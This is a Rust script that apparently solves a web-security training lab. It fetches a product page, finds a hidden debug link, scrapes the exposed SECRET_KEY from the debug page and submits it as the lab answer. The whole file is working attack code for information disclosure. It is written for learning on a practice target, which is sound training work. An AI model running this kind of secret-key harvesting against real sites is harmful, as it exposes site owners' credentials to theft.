/************************************************
*
* Lab: Information disclosure on debug page
*
* Hack Steps: 
*      1. Fetch a product page
*      2. Extract the debug path
*      3. Fetch the debug path
*      4. Extract the secret key
*      5. Submit the solution
*
*************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a58007b048c3742804ea317009900f6.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Checking the source code.. ");
    flush_terminal();

    let product = fetch("/product?productId=4");

    println!("{}", "OK".green());
    print!("⦗2⦘ Extracting the debug path.. ");
    flush_terminal();

    let mut body = product.text().unwrap();
    let debug_path = capture_pattern_from_text("href=(.*)>Debug", &body);

    println!("{} => {}", "OK".green(), debug_path.yellow());
    print!("⦗3⦘ Fetching the debug page.. ");
    flush_terminal();

    let debug_page = fetch(&debug_path);

    println!("{}", "OK".green());
    print!("⦗4⦘ Extracting the secret key.. ");
    flush_terminal();

    body = debug_page.text().unwrap();
    let secret_key = capture_pattern_from_text("SECRET_KEY.*class=\"v\">(.*) <", &body);

    println!("{} => {}", "OK".green(), secret_key.yellow());
    print!("⦗5⦘ Submitting the solution.. ");
    flush_terminal();

    submit_solution(&secret_key);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn submit_solution(answer: &str) {
    WEB_CLIENT
        .post(format!("{LAB_URL}/submitSolution"))
        .form(&HashMap::from([("answer", answer)]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to submit the solution".red()));
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
